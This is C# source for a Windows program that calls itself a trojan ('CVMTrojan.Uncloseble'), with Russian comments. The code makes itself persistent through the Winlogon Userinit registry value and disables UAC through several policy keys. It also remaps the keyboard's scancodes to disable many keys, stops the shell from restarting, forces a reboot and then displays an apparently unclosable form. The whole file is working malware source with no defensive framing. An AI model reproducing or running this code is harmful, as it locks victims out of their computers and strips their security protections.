using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace CVMTrojan.Uncloseble
{
    internal static class Program
    {

        [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
        [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);
        public static void WinlogonStartup(string StartupTo, string Path) //Добавление программы в автозапуск через Winlogon (by DesConnet)
        {
            
            RegistryKey Winlogon = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true); //Открываем ветку в реестре

            string StartupValue = Winlogon.GetValue(StartupTo).ToString(); //Получаем значение и заносим в переменную
            if (Path != null && StartupValue.Contains(Path) == false) //Если путь существует и оно не занесено в значение
            {
                Winlogon.SetValue(StartupTo, $"{StartupValue}, {Path}"); //Добавляем в значение наш путь
                Winlogon.Close(); //Закрываем ветку
            }
        }

        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            RegistryKey CheckRun = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\WinDef");
            if (CheckRun.GetValue("Run") == null)
            {
                WinlogonStartup("Userinit", Application.ExecutablePath);
                try
                {
                    RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                    key.SetValue("EnableLUA", 0);
                    key.SetValue("EnableInstallerDetection", 0);
                    key.SetValue("PromptOnSecureDesktop", 0);
                    key.SetValue("ConsentPromptBehaviorAdmin", 0);
                    key.SetValue("EnableSecureUIAPaths", 0);
                    key.SetValue("EnableVirtualization", 0);
                    key.SetValue("FilterAdministratorToken", 0);
                    key.SetValue("EnableUIADesktopToggle", 0);
                }
                catch { }

                CheckRun.SetValue("Run", 1);
                CheckRun.Close();

                RegistryKey r1 = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Keyboard Layout");
               r1.SetValue("Scancode Map", new byte[] { 0x00 ,0x00,  0x00,  0x00,  0x00 , 0x00,  0x00 , 0x00,  0x1E,  0x00,  0x00,  0x00,  0x00,  0x00,  0x3B,  0x00,  0x00,  0x00 , 0x3C , 0x00 , 0x00 , 0x00,  0x3D , 0x00 , 0x00,  0x00,  0x3E,  0x00,  0x00,  0x00,  0x3F , 0x00 , 0x00 , 0x00 , 0x40 , 0x00 , 0x00  ,0x00,  0x33 , 0x00  ,0x00 , 0x00 , 0x34 , 0x00,  0x00,  0x00,  0x35 , 0x00 , 0x00 , 0x00  ,0x0B , 0x00 , 0x00  ,0x00  ,0x02 , 0x00,  0x00 , 0x00,  0x03 , 0x00,  0x00 , 0x00 , 0x04,  0x00 , 0x00 , 0x00 , 0x05,  0x00 , 0x00 , 0x00 , 0x06,  0x00 , 0x00 , 0x00 , 0x08,  0x00 , 0x00 , 0x00  ,0x09 , 0x00 , 0x00 , 0x00 , 0x0A , 0x00 , 0x00 , 0x00,  0x23 , 0x00 , 0x00 , 0x00,  0x52 , 0x00 , 0x00,  0x00,  0x0E,  0x00 , 0x00 , 0x00 , 0x3A , 0x00 , 0x00 , 0x00 , 0x1C , 0x00 , 0x00 , 0x00 , 0x01 , 0x00 , 0x00 , 0x00 , 0x1D , 0x00 , 0x00 , 0x00 , 0x2A , 0x00  ,0x00 , 0x00 , 0x1D,  0xE0,  0x00 , 0x00 , 0x36 , 0x00 , 0x00,  0x00,  0x0F , 0x00,  0x00,  0x00  ,0x00 ,0x00 }, RegistryValueKind.Binary);
                r1.Close();

                try
                {
                    RegistryKey regKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                    regKey.SetValue("AutoRestartShell", 0, RegistryValueKind.DWord);
                    regKey.Close();
                }
                catch {}

                Reboot r = new Reboot();
                r.halt(true, true);
            }
            else
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Form1());
            }
        }
    }
}
